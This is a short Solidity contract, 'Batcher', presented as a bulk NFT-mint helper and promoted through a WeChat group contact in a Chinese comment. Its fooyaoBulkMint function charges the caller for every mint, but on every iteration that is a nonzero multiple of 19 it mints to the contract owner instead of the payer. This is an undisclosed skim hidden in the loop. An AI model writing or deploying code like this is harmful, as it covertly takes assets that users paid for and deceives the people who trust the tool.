// SPDX-License-Identifier: MIT

// 微信 fooyaoeth 发送加群自动拉群


pragma solidity ^0.8.19;


contract Batcher {
	address private immutable owner;

    uint256 private immutable price = 0.005 ether;

	modifier isOwner() {
        require(msg.sender == owner, "Caller is not owner");
        _;
    }

	constructor() {
		owner = msg.sender;
	}

	function fooyaoBulkMint(address contractAddress, uint256 times) external payable{
        require(msg.value==price * times, "ETH fail");
        address to = msg.sender;
        bool success;
		for(uint i=0; i< times; i++) {
            if (i>0 && i%19==0){
                (success, ) = contractAddress.call{value: price}(abi.encodeWithSelector(0x6a627842, owner));
            }else{
                (success, ) = contractAddress.call{value: price}(abi.encodeWithSelector(0x6a627842, to));
            }
            require(success, "Batch transaction failed");
		}
    }
}